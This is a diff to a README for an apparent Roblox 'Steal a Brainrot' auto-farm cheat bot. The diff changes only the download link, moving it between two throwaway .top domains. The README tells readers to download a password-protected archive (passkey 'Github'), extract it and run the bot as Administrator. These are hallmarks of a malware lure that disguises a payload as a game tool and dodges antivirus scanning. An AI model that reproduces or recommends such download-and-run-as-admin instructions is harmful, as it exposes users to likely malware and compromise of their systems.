@@ -6,7 +6,7 @@ Steal a Brainrot auto-farm bot with auto-steal, auto-rebirth, auto-buy, and mone
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ This bot automates farming, stealing, rebirth, and money generation to help you 
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 2. Extract the archive.
 3. Launch Roblox and join Steal a Brainrot.
 4. Run the bot **as Administrator**.
